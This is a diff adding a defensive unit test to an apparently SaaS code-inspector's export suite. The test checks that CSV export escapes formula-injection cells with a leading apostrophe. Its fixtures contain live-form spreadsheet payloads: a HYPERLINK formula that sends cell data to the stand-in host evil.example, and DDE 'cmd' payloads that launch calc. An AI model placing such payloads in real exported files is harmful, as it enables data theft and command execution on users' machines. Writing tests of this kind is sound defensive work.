@@ -107,4 +107,67 @@ describe('SaaS Production Features 2 & 4: Scan History & Export Engine Suite', (
     assert.ok(pdfExport.includes('FIGM Code Inspector'));
     assert.ok(pdfExport.includes('ISO/IEC 25010 System and Software Quality Models'));
   });
+
+  it('SEC-07: CSV export neutralizes formula-injection characters (=, +, -, @) in every field', async () => {
+    // A cell value opening with =/+/-/@ is interpreted as a formula by Excel/Sheets when the
+    // exported CSV is opened -- a real code-execution vector, since offendingCodeSnippet and
+    // remediation both ultimately derive from analyzed source code (attacker-influenceable via
+    // whatever a user pastes/uploads). Previously only embedded double-quotes were escaped.
+    RepositoryFactory.resetProvider();
+    const userId = `usr_test_csvinj_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
+
+    const record = await ScanRepository.createScanRecord({
+      userId,
+      fileName: 'Injection.tsx',
+      framework: 'React',
+      scanTimeMs: 5,
+      memoryUsageMb: 1.2,
+      qualityScore: 50,
+      ruleCount: 1,
+      aiFixCount: 0,
+      diagnostics: [
+        {
+          ruleId: 'FIGM-REACT-03',
+          ruleName: '=HYPERLINK("http://evil.example/steal?data="&A1,"Click")',
+          severity: 'CRITICAL',
+          domain: 'PERFORMANCE',
+          offendingCodeSnippet: '=cmd|\' /C calc\'!A1',
+          remediation: '+SUM(1+1)*cmd|\' /C calc\'!A1',
+        },
+      ],
+    });
+
+    const csvExport = ExportService.exportCSV(record);
+    const dataRow = csvExport.split('\n').find((l) => l.includes('FIGM-REACT-03'));
+    assert.ok(dataRow, 'the injected diagnostic row must be present in the export');
+    assert.ok(!dataRow!.includes(',=cmd') && !dataRow!.includes('"=cmd'), 'offendingCodeSnippet starting with = must not appear as a live formula cell');
+    assert.ok(dataRow!.includes("'=cmd"), 'a leading apostrophe must neutralize the =-prefixed snippet');
+    assert.ok(dataRow!.includes("'=HYPERLINK") || dataRow!.includes('"\'=HYPERLINK'), 'a leading apostrophe must neutralize the =-prefixed rule name');
+    assert.ok(dataRow!.includes("'+SUM"), 'a leading apostrophe must neutralize the +-prefixed remediation text');
+
+    // A benign snippet that merely CONTAINS one of these characters mid-string (not leading) must
+    // be left untouched -- this is a leading-character check, not a blanket character strip.
+    const benignRecord = await ScanRepository.createScanRecord({
+      userId,
+      fileName: 'Benign.tsx',
+      framework: 'React',
+      scanTimeMs: 5,
+      memoryUsageMb: 1.2,
+      qualityScore: 90,
+      ruleCount: 1,
+      aiFixCount: 0,
+      diagnostics: [
+        {
+          ruleId: 'FIGM-PERF-01',
+          ruleName: 'Invariant Allocation',
+          severity: 'HIGH',
+          domain: 'PERFORMANCE',
+          offendingCodeSnippet: 'const total = a + b - c;',
+          remediation: 'Hoist the a+b-c computation out of the loop.',
+        },
+      ],
+    });
+    const benignCsv = ExportService.exportCSV(benignRecord);
+    assert.ok(benignCsv.includes('const total = a + b - c;'), 'a mid-string +/- must not be altered');
+  });
 });
